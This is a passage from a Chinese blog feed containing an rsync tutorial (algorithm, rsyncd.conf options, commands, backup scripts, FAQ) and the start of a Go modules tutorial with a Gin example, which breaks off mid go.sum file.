    <content type="text"><![CDATA[什么是 RsyncRsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件。Rsync 使用所谓的 “Rsync 算法” 来使本地和远 程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 Rsync 本来是用于替代 rcp 的一个工具，目前由 samba 维护，所以 rsync.conf 文件的格式类似于 Samba 的 主配置文件。Rsync 可以通过 rsh 或 ssh 使用，也能以 daemon 模式去运行，在以 daemon 方式运行时 Rsync server 会打开一个 873 端口，等待客户端去连接。连接时，Rsync server 会检查口令是否相符，若通过口令查核，则可以开始进行文件传输。第一次连通完成时，会把整份文件传输一次，以后则就只需进行增量备份。 Rsync 支持大多数的类 Unix 系统，无论是 Linux、Solaris 还是 BSD 上都经过了良好的测试。此外，它在 windows 平台下也有相应的版本，如 cwRsync 和 Sync2NAS 等工具。 Rsync 的基本特点如下： 可以镜像保存整个目录树和文件系统； 可以很容易做到保持原来文件的权限、时间、软硬链接等； 无须特殊权限即可安装； 优化的流程，文件传输效率高； 可以使用 rsh、ssh 等方式来传输文件，当然也可以通过直接的 socket 连接； 支持匿名传输。 Rsync 同步算法Rsync 只所以同步文件的速度相当快，是因为 “Rsync 同步算法” 能在很短的时间内计算出需要备份的数据，关于 Rsync 的同步算法描述如下： 假定在 1 号和 2 号两台计算机之间同步相似的文件 A 与 B，其中 1 号对文件 A 拥有访问权，2 号对文件 B 拥有访问权。并且假定主机 1 号与 2 号之间的网络带宽很小。那么 rsync 算法将通过下面的五个步骤来完成： 2 号将文件 B 分割成一组不重叠的固定大小为 S 字节的数据块，最后一块可能会比 S 小。 2 号对每一个分割好的数据块执行两种校验：一种是 32 位的滚动弱校验，另一种是 128 位的 MD4 强校验 2 号将这些校验结果发给 1 号。 1 号通过搜索文件 A 的所有大小为 S 的数据块 (偏移量可以任选，不一定非要是 S 的倍数)，来寻找与文件 B 的某一块有着相同的弱校验码和强校验码的数据块。这项工作可以借助滚动校验的特性很快完成。 1 号发给 2 号一串指令来生成文件 A 在 2 号上的备份。这里的每一条指令要么是对文件 B 经拥有某一个数据块而不须重传的证明，要么是一个数据块，这个数据块肯定是没有与文件 B 的任何一个数据块匹配上的。 Rsync 参数说明配置文件：rsyncd.conf 全局参数在文件中，[module]之前的所有参数都是全局参数，当然也可以在全局参数部分定义模块参数，这时候该参数的值就是所有模块的默认值。 port指定后台程序使用的端口号，默认为 873。 motd file用来指定一个消息文件，当客户连接服务器时该文件的内容显示给客户，默认是没有 motd 文件的。 log file指定 rsync 的日志文件，而不将日志发送给 syslog。比如可指定为 /var/log/rsyncd.log。 pid file指定 rsync 的 pid 文件，通常指定为 /var/run/rsyncd.pid。 syslog facility指定 rsync 发送日志消息给 syslog 时的消息级别，常见的消息级别是： daemon 默认值 uth authpriv cron daemon ftp kern lpr mail news security sys-log user uucp local0 local1 local2 local3 local4 local5 local6 local7 模块参数主要是定义服务器哪个目录要被同步。其格式必须为“[module]”形式，这个名字就是在 rsync 客户端看到的名字，其实有点象 Samba 服务器提供的共享名。而服务器真正同步的数据是通过 path 来指定的。我们可以根据自己的需要，来指定多个模块，模块中可以定义以下参数： comment给模块指定一个描述，该描述连同模块名在客户连接得到模块列表时显示给客户。默认没有描述定义。 path指定该模块的供备份的目录树路径，该参数是必须指定的。 use chroot如果指定为 true，那么 rsync 在传输文件以前首先 chroot 到 path 参数所指定的目录下。这样做的原因是实现额外的安全防护，但是缺点是需要以 root 权限，并且不能备份指向外部的符号连接所指向的目录文件。默认值为 true。 uid指定当该模块传输文件时守护进程应该具有的 uid，配合 gid选项使用可以确定哪些可以访问怎么样的文件权限，默认值是”nobody”。 gid指定当该模块传输文件时守护进程应该具有的 gid。默认值为”nobody”。 max connections指定该模块的最大并发连接数量以保护服务器，超过限制的连接请求将被告知随后再试。默认值是 0，也就是没有限制。 list该选项设定当客户请求可以使用的模块列表时，该模块是否应该被列出。如果设置该选项为 false，可以创建隐藏的模块。默认值是 true。 read only设定是否允许客户上载文件。如果为 true 那么任何上载请求都会失败，如果为 false 并且服务器目录读写权限允许那么上载是允许的。默认值为 true。 exclude用来指定多个由空格隔开的多个文件或目录 (相对路径)，并将其添加到 exclude 列表中。这等同于在客户端命令中使用--exclude来指定 模式，一个模块只能指定一个 exclude 选项。但是需要注意的一点是该选项有一定的安全性问题，客户很有可能绕过 exclude 列表，如果希望确保特定 的文件不能被访问，那就最好结合 uid/gid 选项一起使用。 exclude from指定一个包含 exclude 模式的定义的文件名，服务器从该文件中读取 exclude 列表定义。 include用来指定不排除符合要求的文件或目录。这等同于在客户端命令中使用–include 来指定模式，结合 include 和 exclude 可以定义复杂的 exclude/include 规则。 include from指定一个包含 include 模式的定义的文件名，服务器从该文件中读取 include 列表定义。 auth users指定由空格或逗号分隔的用户名列表，只有这些用户才允许连接该模块。这里的用户和系统用户没有任何关系。如果”auth users” 被设置，那么客户端发出对该模块的连接请求以后会被 rsync 请求 challenged 进行验证身份这里使用的 challenge/response 认证协议。用户的名和密码以明文方式存放在”secrets file” 选项指定的文件中。默认情况下无需密码就可以连接模块 (也就是匿名方式)。 secrets file指定一个包含定义用户名: 密码对的文件。只有在”auth users” 被定义时，该文件才有作用。文件每行包含一个 username:passwd 对。一般来说密码最好不要超过 8 个字符。没有默认的 secures file，需要限式指定一个 (例如：/etc/rsyncd.passwd)。注意：该文件的权限一定要是 600，否则客户端将不能连接服务器。 strict modes指定是否监测密码文件的权限，如果该选项值为 true 那么密码文件只能被 rsync 服务器运行身份的用户访问，其他任何用户不可以访问该文件。默认值为 true。 hosts allow指定哪些 IP 的客户允许连接该模块。客户模式定义可以是以下形式： 单个 IP 地址，例如：192.167.0.1 整个网段，例如：192.168.0.0/24，也可以是 192.168.0.0/255.255.255.0 多个 IP 或网段需要用空格隔开，“*” 则表示所有，默认是允许所有主机连接。 hosts deny指定不允许连接 rsync 服务器的机器，可以使用 hosts allow 的定义方式来进行定义。默认是没有 hosts deny 定义。 ignore errors指定 rsyncd 在判断是否运行传输时的删除操作时忽略 server 上的 IO 错误，一般来说 rsync 在出现 IO 错误时将将跳过--delete操作，以防止因为暂时的资源不足或其它 IO 错误导致的严重问题。 ignore nonreadable指定 rysnc 服务器完全忽略那些用户没有访问权限的文件。这对于在需要备份的目录中有些文件是不应该被备份者得到的情况是有意义的。 lock file指定支持 max connections 参数的锁文件，默认值是 /var/run/rsyncd.lock。 transfer logging使 rsync 服务器使用 ftp 格式的文件来记录下载和上载操作在自己单独的日志中。 log format通过该选项用户在使用 transfer logging 可以自己定制日志文件的字段。其格式是一个包含格式定义符的字符串，可以使用的格式定义符如下：12345678910111213%h 远程主机名%a 远程IP地址%l 文件长度字符数%p 该次rsync会话的进程id%o 操作类型："send"或"recv"%f 文件名%P 模块路径%m 模块名%t 当前时间%u 认证的用户名(匿名时是null)%b 实际传输的字节数%c 当发送文件时，该字段记录该文件的校验码默认log格式为：`%o %h [%a] %m (%u) %f %l`，一般来说,在每行的头上会添加`%t [%p]`。在源代码中同时发布有一个叫rsyncstats的perl脚本程序来统计这种格式的日志文件。 timeout通过该选项可以覆盖客户指定的 IP 超时时间。通过该选项可以确保 rsync 服务器不会永远等待一个崩溃的客户端。超时单位为秒钟，0 表示没有超时定义，这也是默认值。对于匿名 rsync 服务器来说，一个理想的数字是 600。 refuse options通过该选项可以定义一些不允许客户对该模块使用的命令参数列表。这里必须使用命令全名，而不能是简称。但发生拒绝某个命令的情况时服务器将报告错误信息然后退出。如果要防止使用压缩，应该是：dont compress = *。 dont compress用来指定那些不进行压缩处理再传输的文件，默认值是 *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz Rsync 命令在对 rsync 服务器配置结束以后，下一步就需要在客户端发出 rsync 命令来实现将服务器端的文件备份到客户端来。rsync 是一个功能非常强大的工具，其命令也有很多功能特色选项，下面就对它的选项一一进行分析说明。Rsync 的命令格式可以为以下六种： rsync [OPTION]... SRC DEST rsync [OPTION]... SRC [USER@]HOST:DEST rsync [OPTION]... [USER@]HOST:SRC DEST rsync [OPTION]... [USER@]HOST::SRC DEST rsync [OPTION]... SRC [USER@]HOST::DEST rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] 对应于以上六种命令格式，rsync 有六种不同的工作模式： 拷贝本地文件。当 SRC 和 DES 路径信息都不包含有单个冒号”:” 分隔符时就启动这种工作模式。如：rsync -a /data /backup 使用一个远程 shell 程序 (如 rsh、ssh) 来实现将本地机器的内容拷贝到远程机器。当 DST 路径地址包含单个冒号”:”分隔符时启动该模式。如：rsync -avz *.c foo:src 使用一个远程 shell 程序 (如 rsh、ssh) 来实现将远程机器的内容拷贝到本地机器。当 SRC 地址路径包含单个冒号”:”分隔符时启动该模式。如：rsync -avz foo:src/bar /data 从远程 rsync 服务器中拷贝文件到本地机。当 SRC 路径信息包含”::” 分隔符时启动该模式。如：rsync -av root@172.16.78.192::www /databack 从本地机器拷贝文件到远程 rsync 服务器中。当 DST 路径信息包含”::” 分隔符时启动该模式。如：rsync -av /databack root@172.16.78.192::www 列远程机的文件列表。这类似于 rsync 传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://172.16.78.192/www rsync 参数的具体解释如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061-v, --verbose 详细模式输出-q, --quiet 精简输出模式-c, --checksum 打开校验开关，强制对文件传输进行校验-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD-r, --recursive 对子目录以递归模式处理-R, --relative 使用相对路径信息-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。--backup-dir 将备份文件(如~filename)存放在在目录下。-suffix=SUFFIX 定义备份文件前缀-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件。(不覆盖更新的文件)-l, --links 保留软链结-L, --copy-links 想对待常规文件一样处理软链结--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结--safe-links 忽略指向SRC路径目录树以外的链结-H, --hard-links 保留硬链结-p, --perms 保持文件权限-o, --owner 保持文件属主信息-g, --group 保持文件属组信息-D, --devices 保持设备文件信息-t, --times 保持文件时间信息-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间-n, --dry-run现实哪些文件将被传输-W, --whole-file 拷贝文件，不进行增量检测-x, --one-file-system 不要跨越文件系统边界-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节-e, --rsh=COMMAND 指定使用rsh、ssh方式进行数据同步--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件--delete 删除那些DST中SRC没有的文件--delete-excluded 同样删除接收端那些被该选项指定排除的文件--delete-after 传输结束以后再删除--ignore-errors 及时出现IO错误也进行删除--max-delete=NUM 最多删除NUM个文件--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输--force 强制删除目录，即使不为空--numeric-ids 不将数字的用户和组ID匹配为用户名和组名--timeout=TIME IP超时时间，单位为秒-I, --ignore-times 不跳过那些有同样的时间和长度的文件--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0-T --temp-dir=DIR 在DIR中创建临时文件--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份-P 等同于 --partial--progress 显示备份过程-z, --compress 对备份的文件在传输时进行压缩处理--exclude=PATTERN 指定排除不需要传输的文件模式--include=PATTERN 指定不排除而需要传输的文件模式--exclude-from=FILE 排除FILE中指定模式的文件--include-from=FILE 不排除FILE指定模式匹配的文件--version 打印版本信息--address 绑定到特定的地址--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件--port=PORT 指定其他的rsync服务端口--blocking-io 对远程shell使用阻塞IO-stats 给出某些文件的传输状态--progress 在传输时现实传输过程--log-format=formAT 指定日志文件格式--password-file=FILE 从FILE中得到密码--bwlimit=KBPS 限制I/O带宽，KBytes per second-h, --help 显示帮助信息 Rsync 使用实例SSH 方式在服务端启动 ssh 服务12$ service sshd start启动 sshd： [确定] 使用 rsync 进行同步 接下来就可以在客户端使用 rsync 命令来备份服务端上的数据了，SSH 方式是通过系统用户来进行备份的，如下：123456789101112131415$ rsync -vzrtopg --progress -e ssh --delete work@172.16.78.192:/www/* /databack/experiment/rsyncwork@172.16.78.192's password:receiving file list ...5 files to considertest/a0 100% 0.00kB/s 527:35:41 (1, 20.0% of 5)b67 100% 65.43kB/s 0:00:00 (2, 40.0% of 5)c0 100% 0.00kB/s 527:35:41 (3, 60.0% of 5)dd100663296 100% 42.22MB/s 0:00:02 (4, 80.0% of 5)sent 96 bytes received 98190 bytes 11563.06 bytes/sectotal size is 100663363 speedup is 1024.19 上面的信息描述了整个的备份过程，以及总共备份数据的大小。 后台服务方式启动 rsync 服务 编辑 / etc/xinetd.d/rsync 文件，将其中的 disable=yes 改为 disable=no，并重启 xinetd 服务，如下：12345678910111213# default: off# description: The rsync server is a good addition to an ftp server, as it \# allows crc checksumming etc.service rsync{disable = nosocket_type = streamwait = nouser = rootserver = /usr/bin/rsyncserver_args = --daemonlog_on_failure += USERID} 123$ /etc/init.d/xinetd restart停止 xinetd： [确定]启动 xinetd： [确定] 或者自己手动启动并添加自启动：12/usr/bin/rsync --daemon --config=/etc/rsyncd.confecho "/usr/bin/rsync --daemon --config=/etc/rsyncd.conf" >> /etc/rc.local 创建配置文件 默认安装好 rsync 程序后，并不会自动创建 rsync 的主配置文件，需要手工来创建，其主配置文件为 “/etc/rsyncd.conf”，创建该文件并插入如下内容：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# Minimal configuration file for rsync daemon# See rsync(1) and rsyncd.conf(5) man pages for help############################ 以下是公共参数配置 ############################# This line is required by the /etc/init.d/rsyncd scriptpid file = /var/run/rsyncd.pid# 服务的端口port = 873# 服务的IPaddress = 10.44.201.202# 运行的宿主账户，这里为简单就root了uid = rootgid = root# 打开（yes）后有个功能是让符号链接可以同步过去（不通过符号链接对应的实际文件）use chroot = no# 客户端只读read only = yes#limit access to private LANshosts allow=10.51.56.165/255.255.255.0# hosts deny=*# 最大连接数max connections = 5# 欢迎信息对应的文件# motd file = /etc/rsyncd.motd# 客户端链接的超时时间timeout = 300# 以下是日志相关配置，可选使用独立日志文件和系统日志# This will give you a separate log file# log file = /var/log/rsync.log# This will log every file transferred - up to 85,000+ per user, per sync# transfer logging = yes# log format = %t %a %m %f %b# syslog facility = local3############################# 同步模块配置 ################################[thrift]# 需要同步的路径path = /data/JiemoLucenes# 客户端可以使用list命令列表显示list=yes# 忽略错误ignore errors# 认证用户auth users = root# 认证使用的账户密码文件secrets file = /etc/rsyncd.secrets# 备注信息comment = This is nexus data# 如果有忽略的子目录，可以通过exclude定义# exclude = easylife/ samba/ 创建密码文件采用这种方式不能使用系统用户对客户端进行认证，所以需要创建一个密码文件，其格式为 “username:password”，用户名可以和密码可以随便定义，最好不要和系统帐户一致，同时要把创建的密码文件权限设置为 600，这在前面的模块参数做了详细介绍。12echo "work:abc123" > /etc/rsyncd.passwdchmod 600 /etc/rsyncd.passwd 备份完成以上工作，现在就可以对数据进行备份了，如下：123456789101112131415$ rsync -avz --progress --delete work@172.16.78.192::www /databack/experiment/rsyncPassword:receiving file list ...6 files to consider./ files...a0 100% 0.00kB/s 528:20:41 (1, 50.0% of 6)b67 100% 65.43kB/s 0:00:00 (2, 66.7% of 6)c0 100% 0.00kB/s 528:20:41 (3, 83.3% of 6)dd100663296 100% 37.49MB/s 0:00:02 (4, 100.0% of 6)sent 172 bytes received 98276 bytes 17899.64 bytes/sectotal size is 150995011 speedup is 1533.75 恢复当服务器的数据出现问题时，那么这时就需要通过客户端的数据对服务端进行恢复，但前提是服务端允许客户端有写入权限，否则也不能在客户端直接对服务端进行恢复，使用 rsync 对数据进行恢复的方法如下：1234567891011$ rsync -avz --progress /databack/experiment/rsync/ work@172.16.78.192::wwwPassword:building file list ...6 files to consider./ab67 100% 0.00kB/s 0:00:00 (2, 66.7% of 6)csent 258 bytes received 76 bytes 95.43 bytes/sectotal size is 150995011 speedup is 452080.87 示例脚本这里这些脚本都是 rsync 网站上的例子：1、每隔七天将数据往中心服务器做增量备份1234567891011121314151617181920212223242526272829303132333435#!/bin/sh# This script does personal backups to a rsync backup server. You will end up# with a 7 day rotating incremental backup. The incrementals will go# into subdirectories named after the day of the week, and the current# full backup goes into a directory called "current"# tridge@linuxcare.com# directory to backupBDIR=/home/$USER# excludes file - this contains a wildcard pattern per line of files to excludeEXCLUDES=$HOME/cron/excludes# the name of the backup machineBSERVER=owl# your password on the backup serverexport RSYNC_PASSWORD=XXXXXX#######################################################################BACKUPDIR=`date +%A`OPTS="--force --ignore-errors --delete-excluded --exclude-from=$EXCLUDES--delete --backup --backup-dir=/$BACKUPDIR -a"export PATH=$PATH:/bin:/usr/bin:/usr/local/bin# the following line clears the last weeks incremental directory[ -d $HOME/emptydir ] || mkdir $HOME/emptydirrsync --delete -a $HOME/emptydir/ $BSERVER::$USER/$BACKUPDIR/rmdir $HOME/emptydir# now the actual transferrsync $OPTS $BDIR $BSERVER::$USER/current 2、备份至一个空闲的硬盘12345678910111213141516#!/bin/shexport PATH=/usr/local/bin:/usr/bin:/binLIST="rootfs usr data data2"for d in $LIST; domount /backup/$drsync -ax --exclude fstab --delete /$d/ /backup/$d/umount /backup/$ddoneDAY=`date "+%A"`rsync -a --delete /usr/local/apache /data2/backups/$DAYrsync -a --delete /data/solid /data2/backups/$DAY 3、对 vger.rutgers.edu 的 cvs 树进行镜像1234567891011121314151617181920212223#!/bin/bashcd /var/www/cvs/vger/PATH=/usr/local/bin:/usr/freeware/bin:/usr/bin:/binRUN=`lps x | grep rsync | grep -v grep | wc -l`if [ "$RUN" -gt 0 ]; thenecho already runningexit 1firsync -az vger.rutgers.edu::cvs/CVSROOT/ChangeLog $HOME/ChangeLogsum1=`sum $HOME/ChangeLog`sum2=`sum /var/www/cvs/vger/CVSROOT/ChangeLog`if [ "$sum1" = "$sum2" ]; thenecho nothing to doexit 0firsync -az --delete --force vger.rutgers.edu::cvs/ /var/www/cvs/vger/exit 0 FAQQ：如何通过 ssh 进行 rsync，而且无须输入密码？ A：可以通过以下几个步骤 * 通过 ssh-keygen 在 server A 上建立 SSH keys，不要指定密码，你会在~/.ssh 下看到 identity 和 identity.pub 文件 * 在 server B 上的 home 目录建立子目录. ssh * 将 A 的 identity.pub 拷贝到 server B 上 * 将 identity.pub 加到`~[user b]/.ssh/authorized_keys` * 于是 server A 上的 A 用户，可通过下面命令以用户 B ssh 到 server B 上了 e.g.`ssh -l userB serverB` * 这样就使 server A 上的用户 A 就可以 ssh 以用户 B 的身份无需密码登陆到 server B 上了。 Q：如何通过在不危害安全的情况下通过防火墙使用 rsync? A：解答如下： 这通常有两种情况，一种是服务器在防火墙内，一种是服务器在防火墙外。无论哪种情况，通常还是使用 ssh，这时最好新建一个备份用户，并且配置 sshd 仅允许这个用户通过 RSA 认证方式进入。如果服务器在防火墙内，则最好限定客户端的 IP 地址，拒绝其它所有连接。如果客户机在防火墙内，则可以简 单允许防火墙打开 TCP 端口 22 的 ssh 外发连接就 ok 了。 Q：我能将更改过或者删除的文件也备份上来吗？ A：当然可以： 你可以使用如：rsync -other -options -backupdir = ./backup-2000-2-13 ...这样的命令来实现。这样如果源文件:/path/to/some/file.c 改变了，那么旧的文件就会被移到./backup-2000-2-13/path/to/some/file.c，这里这个目录需要自己手工建立起来 Q：我需要在防火墙上开放哪些端口以适应 rsync？ A：视情况而定 rsync 可以直接通过 873 端口的 tcp 连接传文件，也可以通过 22 端口的 ssh 来进行文件传递，但你也可以通过下列命令改变它的端口：rsync --port 8730 otherhost::或者rsync -e 'ssh -p 2002' otherhost: Q：我如何通过 rsync 只复制目录结构，忽略掉文件呢？ A：rsync -av --include '*/' --exclude '*' source-dir dest-dir Q：为什么我总会出现 “Read-only file system” 的错误呢？ A：看看是否忘了设 “read only = no” 了 Q：为什么我会出现‘@ERROR: invalid gid’的错误呢？ A：rsync 使用时默认是用 uid=nobody;gid=nobody 来运行的，如果你的系统不存在 nobody 组的话，就会出现这样的错误，可以试试 gid = nogroup 或者其它 Q：绑定端口 873 失败是怎么回事？ A：如果你不是以 root 权限运行这一守护进程的话，因为 1024 端口以下是特权端口，会出现这样的错误。你可以用–port 参数来改变。 Q：为什么我认证失败？ A：从你的命令行看来：123$ rsync -a 144.16.251.213::test testPassword:@ERROR: auth failed on module test 应该是没有以你的用户名登陆导致的问题，试试rsync -a max@144.16.251.213::test test document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Modules 初试 -- Go 包管理解决之道]]></title>
    <url>%2F2019%2F03%2F29%2FgoModules%2F</url>
    <content type="text"><![CDATA[前言Go 的包管理是一直是为人诟病之处，从 Go 1.5 引入的 vendor 机制，到准官方工具 dep，目前为止还没一个简便的解决方案 不过现在 go modules 随着 golang1.11 的发布而和我们见面了，这是官方提倡的新的包管理，乃至项目管理机制，可以不再需要 GOPATH 的存在。 欣喜之余，赶紧上手来试一下吧~ Go modules 的前世今生 说起 Go 的包依赖管理，作为 Google 脑残粉的我也是连连叹气。。。 如果说 Java(Maven) 是坨 shit 的话，那 Go 真是连 Java 都不如。 自 2007 年 “三巨头”（Robert Griesemer, Rob Pike, Ken Thompson）提出设计和实现 Go 语言以来，这门语言已经发展和演化了十余年了。 但是自从 Go 语言诞生以来吧，大佬们就认为go get 已经挺好了，没必要再额外造一个轮子了——包管理器。 也许是大佬们都不需要团队开发吧，但是大佬毕竟是少数，于是，各种各样的社区解决方案就出现了，可谓是百家争鸣。 dep manul - Vendor packages using git submodules. Godep Govendor godm govend - Manage dependencies like go get but for /vendor. Glide - Manage packages like composer, npm, bundler, or other languages. 当初看到这个列表的时候，我不禁感慨：“这么多的解决方案，可真是挑花了朕的眼睛呀。” Go 官方说：“莫急，这份官方对比拿好不谢。” Go 在构建设计方面深受 Google 内部开发实践的影响，比如 go get 的设计就深受 Google 内部单一代码仓库 (single monorepo) 和基于主干 (trunk/mainline based) 的开发模型的影响：只获取 Trunk/mainline 代码和版本无感知。 Google 内部基于主干的开发模型： 所有开发人员基于主干 trunk/mainline 开发：提交到 trunk 或从 trunk 获取最新的代码（同步到本地 workspace） 版本发布时，建立 Release branch，release branch 实质上就是某一个时刻主干代码的快照 必须同步到 release branch 上的 bug fix 和增强改进代码也通常是先在 trunk 上提交 (commit)，然后再 cherry-pick 到 release branch 上 我们知道 go get 获取的代码会放在 $GOPATH/src 下面，而 go build 会在 $GOROOT/src 和 \$GOPATH/src 下面按照 import path 去搜索 package，由于 go get 获取的都是各个 package repo 的 trunk/mainline 的代码，因此，Go 1.5 之前的 Go compiler 都是基于目标 Go 程序依赖包的 trunk/mainline 代码去编译的。这样的机制带来的问题是显而易见的，至少包括： 因依赖包的 trunk 的变化，导致不同人获取和编译你的包 / 程序时得到的结果实质是不同的，即不能实现 reproduceable build 因依赖包的 trunk 的变化，引入不兼容的实现，导致你的包 / 程序无法通过编译 因依赖包演进而无法通过编译，导致你的包 / 程序无法通过编译 为了实现 reporduceable build，Go 1.5 引入了 Vendor 机制，Go 编译器会优先在 vendor 下搜索依赖的第三方包，这样如果开发者将特定版本的依赖包存放在 vendor 下面并提交到 code repo，那么所有人理论上都会得到同样的编译结果，从而实现 reporduceable build。 在 Go 1.5 发布后的若干年，gopher 们把注意力都集中在如何利用 vendor 解决包依赖问题，从手工添加依赖到 vendor、手工更新依赖，到一众包依赖管理工具的诞生，比如：Govendor、glide 以及号称准官方工具的 dep，努力地尝试着按照当今主流思路解决着诸如 “钻石型依赖” 等难题。 正当 gopher 认为 dep 将 “顺理成章” 地升级为 go toolchain 一部分的时候，今年年初，Go 核心 Team 的技术 leader，也是 Go Team 最早期成员之一的 Russ Cox 在个人博客上连续发表了七篇文章，系统阐述了 Go team 解决” 包依赖管理” 的技术方案: vgo —— modules 的前身。 vgo 的主要思路包括：Semantic Import Versioning、Minimal Version Selection、引入 Go module 等。这七篇文章的发布引发了 Go 社区激烈地争论，尤其是 MVS(最小版本选择) 与目前主流的依赖版本选择方法的相悖让很多传统 Go 包管理工具的维护者” 不满”，尤其是” 准官方工具”：dep。vgo 方案的提出也意味着 dep 项目的生命周期即将进入尾声。 5 月份，Russ Cox 的 Proposal “cmd/go: add package version support to Go toolchain” 被 accepted，这周五早些时候 Russ Cox 将 vgo 的代码 merge 到 Go 主干，并将这套机制正式命名为”go modules”。由于 vgo 项目本身就是一个实验原型，merge 到主干后，vgo 这个术语以及 vgo 项目的使命也就就此结束了。后续 Go modules 机制将直接在 Go 主干上继续演化。 Go modules 是 Go team 在解决包依赖管理方面的一次勇敢尝试，无论如何，对 Go 语言来说都是一个好事。 Go modules 上手这里就用 Gin 框架来实现两个 RESTful API 作示例吧，目录结构如下，两个 handler 分别属于 main 和 pkg/api/data 这两个 package123456mytest├── main.go└── pkg └── api └── data └── api.go 进入 myproj 目录，然后使用 go mod 建立 modules12$ go mod init github.com/wangjiemin/mytestgo: creating new go.mod: module github.com/wangjiemin/mytest 此时会自动产生一个 go.mod 文件，打开看到里边内容只有一行1module github.com/wangjiemin/mytest 现在开始写我们的两个 handler1.pkg/api/data/api.go123456789101112131415package dataimport ( "net/http" "github.com/gin-gonic/gin")// GetDataAPIHealthHandler GET /health-dataapi to expose heathy check result of data APIfunc GetDataAPIHealthHandler(c *gin.Context) { // do something to check heathy of data API c.JSON(http.StatusOK, gin.H{ "code": 0, "message": "Data API is alive", })} 2.main.go1234567891011121314151617181920212223242526272829package mainimport ( dataapi "github.com/wangjiemin/mytest/pkg/api/data" "net/http" "github.com/gin-gonic/gin")func main() { router := gin.Default() router.GET("/health", GetHealthHandler) router.GET("/health-dataapi", dataapi.GetDataAPIHealthHandler) s := &http.Server{ Addr: ":8000", Handler: router, } s.ListenAndServe()}// GetHealthHandler - GET /health to expose service healthfunc GetHealthHandler(c *gin.Context) { c.JSON(http.StatusOK, gin.H{ "code": 0, "message": "Service is alive!", })} 然后用我们的老朋友 go build 创建可执行文件1234567891011121314151617$ go build -o bin/main main.gogo: finding github.com/gin-gonic/gin v1.3.0go: downloading github.com/gin-gonic/gin v1.3.0go: finding github.com/gin-contrib/sse latestgo: finding github.com/ugorji/go/codec latestgo: finding github.com/golang/protobuf/proto latestgo: finding github.com/mattn/go-isatty v0.0.4go: finding gopkg.in/yaml.v2 v2.2.1go: finding gopkg.in/go-playground/validator.v8 v8.18.2go: downloading github.com/gin-contrib/sse v0.0.0-20170109093832-22d885f9ecc7go: downloading github.com/mattn/go-isatty v0.0.4go: downloading github.com/ugorji/go/codec v0.0.0-20181022190402-e5e69e061d4fgo: finding github.com/golang/protobuf v1.2.0go: downloading gopkg.in/yaml.v2 v2.2.1go: downloading gopkg.in/go-playground/validator.v8 v8.18.2go: downloading github.com/golang/protobuf v1.2.0go: finding gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405 可以看到 go compiler 主动下载了相关 package。 那么这些 package 被下载到了哪里呢，你打开 $GOPATH/pkg/mod 就可以看到了，另外 modules 是允许同 package 多种版本并存的。12345678910~/go/pkg/mod├── cache│ ├── download│ │ ├── github.com│ │ └── gopkg.in│ └── vcs│ ├── 37981a5904034a62f98c21341f5422b08cc21ccf1bea734e2aafc91119af6c9b│ ├── 37981a5904034a62f98c21341f5422b08cc21ccf1bea734e2aafc91119af6c9b.info│ ├── 3cef6ea433a84771f272e076cd77b94bd94828b89b4ccd04fa8622bf2d5d3a3f│ ├── 3cef6ea433a84771f272e076cd77b94bd94828b89b4ccd04fa8622bf2d5d3a3f.info 我们看看执行 go build 后 go.mod 文件的内容：1234567891011module github.com/wangjiemin/mytestrequire ( github.com/gin-contrib/sse v0.0.0-20170109093832-22d885f9ecc7 // indirect github.com/gin-gonic/gin v1.3.0 github.com/golang/protobuf v1.2.0 // indirect github.com/mattn/go-isatty v0.0.4 // indirect github.com/ugorji/go/codec v0.0.0-20181022190402-e5e69e061d4f // indirect gopkg.in/go-playground/validator.v8 v8.18.2 // indirect gopkg.in/yaml.v2 v2.2.1 // indirect) 我们看到 go modules 分析出了 mytest 的依赖，并将其放入 go.mod 的 require 区域。 go modules 拉取 package 的原则是先拉取最新的 release tag，若无 tag 则拉最新 commit 并以 Pseudo-versions 的形式记录。因为我们的 module 只直接依赖了 gin，其他的都是非直接依赖的，所以它们后边都被以注释形式标记了 indirect，即传递依赖。go.mod 文件一旦创建后，它的内容将会被 go toolchain 全面掌控。go toolchain 会在各类命令执行时，比如 go get、go build、go mod 等修改和维护 go.mod 文件。 同时发现目录下多了一个文件 go.sum123456789101112131415github.com/gin-contrib/sse v0.0.0-20170109093832-22d885f9ecc7 h1:AzN37oI0cOS+cougNAV9szl6CVoj2RYwzS3DpUQNtlY=github.com/gin-contrib/sse v0.0.0-20170109093832-22d885f9ecc7/go.mod h1:VJ0WA2NBN22VlZ2dKZQPAPnyWw5XTlK1KymzLKsr59s=github.com/gin-gonic/gin v1.3.0 